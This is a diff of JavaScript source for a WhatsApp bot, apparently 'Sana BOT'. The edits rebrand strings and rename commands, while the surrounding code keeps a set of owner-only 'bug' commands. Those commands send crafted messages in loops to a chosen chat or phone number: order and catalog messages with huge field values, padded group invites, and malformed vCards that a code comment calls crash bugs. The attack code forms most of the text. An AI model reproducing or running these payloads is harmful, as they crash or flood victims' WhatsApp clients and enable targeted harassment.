karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: jobotz.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+"inviteExpiration": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 "caption": `${philips}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -7572,7 +7637,7 @@ jobotz.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 	case 'kitrol': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7589,7 +7654,7 @@ var main = {
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`,
+"message": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`,
 "orderTitle": "thejobot",
 "sellerJid": "62896534307129@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
@@ -7605,7 +7670,7 @@ var main = {
 	"itemCount": 2025,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": " 😈❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${philips}",
+	"message": " 😈❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${philips}",
 	"orderTitle": " BUG TROLI ", // 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -7621,7 +7686,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 	}
 	break
 	case 'kitroli': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7634,7 +7699,7 @@ let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {
 	"itemCount": 2025,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": " 😈❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ",
+	"message": " 😈❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ",
 	"orderTitle": " BUG TROLI ", // 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -7651,7 +7716,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 	}
 	break
 	case 'kitrolito': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 a = await jobotz.sendMessage(`${text}@s.whatsapp.net`, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
@@ -7662,7 +7727,7 @@ let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {
 	"itemCount": 2025,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": " 😈❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ",
+	"message": " 😈❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ",
 	"orderTitle": " BUG TROLI ", // 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -7679,7 +7744,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 	}
 	break
 	case 'kigastroli': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 a = await jobotz.sendMessage(`${text}@s.whatsapp.net`, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
@@ -7690,7 +7755,7 @@ let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {
 	"itemCount": 2025,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": " 😈❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ",
+	"message": " 😈❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ",
 	"orderTitle": " BUG TROLI ", // 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -7707,7 +7772,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 	await m.reply(`Berhasil Mengirim Troli Di Nomer ${text}`)
 	}
 	break
-case 'kitroliv2':
+case '25':
 if(!isCreator) return 
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -7720,8 +7785,8 @@ let troli = generateWAMessageFromContent(m.chat,{
 "itemCount": 2025,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"orderTitle": "FIXED BY ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ CASE MD",
-"message":"😈❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵",
+"orderTitle": "FIXED BY ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ CASE MD",
+"message":"😈❴ ㅊ ❈ Sana BOTㅊ ❈ ❵",
 "sellerJid": "5491133536405@s.whatsapp.net",
 "token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
 "totalAmount1000": "IDR 99.99999999999999999999",
@@ -7738,7 +7803,7 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `${virtex2}`,
+"displayName": `> 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘${virtex2}`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:${virtex1}\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:${virtex2}\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": f
 }//👆👆👆BUG TROLI CARD GUA GABUNGIN BUG QUOTED KONTAK/VCARD CRASH HOME YG DULU PERNAH VIRAL 3 BUG KOMBINASI 🗿🗿🗿🗿🗿
@@ -7749,7 +7814,7 @@ jobotz.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
 break
 
 case 'kicatalog': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7760,15 +7825,15 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "99999999999999",
-"title": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ CATALOG 🔥➥ ${buttonvirus}`,
-"description": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ CATALOG ${buttonvirus}`,
+"title": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ CATALOG 🔥➥ ${buttonvirus}`,
+"description": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ CATALOG ${buttonvirus}`,
 "currencyCode": "IDR",
-"footerText": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ CATALOG`,
+"footerText": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ CATALOG`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"retailerId": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 "url": "wa.me/6288286858385"
 },
 "businessOwnerJid": "6288286858385@s.whatsapp.net",
@@ -7778,7 +7843,7 @@ jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 }
 break
-case 'kicatalogv2': {
+case '26': {
 if(!isCreator) return 
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -7793,7 +7858,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productId": "JEMBOD",
 "fileLength": "99999999999",
 "jpegThumbnail": virgam,
-"title": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"title": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 "description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${virtex2}`,
 "currencyCode": "IDR",
 "productImageCount": 923456789,
@@ -7816,8 +7881,8 @@ jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 }
 break
-case 'kibugpc':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '27':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7827,9 +7892,9 @@ pc = generateWAMessageFromContent(m.chat,{
 "inviteCode": "CZ/GAeOhayYnqjcK", //Jan di ubh
 "inviteExpiration": "99999999999",
 "invitetime": "9999999999999999",
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${philips}️️`,
-"jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ MD
-"caption": `BUG INVITE ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n\n${philips}`,
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${philips}️️`,
+"jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ MD
+"caption": `BUG INVITE ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n\n${philips}`,
 "contextInfo": {
 "forwardingScore": 150,
 "isForwarded": true
@@ -7841,7 +7906,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
 liveLocationMessage: {
-caption: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+caption: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
@@ -7850,7 +7915,7 @@ jobotz.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})
 }
 	break
 case 'kibugvn':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7863,7 +7928,7 @@ adehvn = {
         message: { 
             "imageMessage": { 
                 "mimetype": "image/jpeg", 
-                "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+                "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
                 "jpegThumbnail": thumb
             } 
         } 
@@ -7873,8 +7938,8 @@ adehvn = {
  }
  }
 break
-case 'kibugstik':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '28':{
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7887,7 +7952,7 @@ adehvn = {
         message: { 
             "imageMessage": { 
                 "mimetype": "image/jpeg", 
-                "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+                "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
                 "jpegThumbnail": thumb
             } 
         } 
@@ -7898,7 +7963,7 @@ jobotz.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, auth
 }
 break
 case 'kivnto':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
@@ -7909,7 +7974,7 @@ adehvn = {
         message: { 
             "imageMessage": { 
                 "mimetype": "image/jpeg", 
-                "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+                "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
                 "jpegThumbnail": thumb
             } 
         } 
@@ -7919,7 +7984,7 @@ adehvn = {
 await m.reply(`Berhasil Mengirim Bugvn Di Nomer ${text}@s.whatsapp.net`)
 break
 case 'kigasvn':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
@@ -7941,7 +8006,7 @@ adehvn = {
 await m.reply(`Berhasil Mengirim Bugvn Di Nomer ${text}@s.whatsapp.net`)
 break
 case 'kistikto':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
@@ -7962,7 +8027,7 @@ jobotz.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: glo
 await m.reply(`Berhasil Mengirim Bugstik Di Nomer ${text}@s.whatsapp.net`)
 break
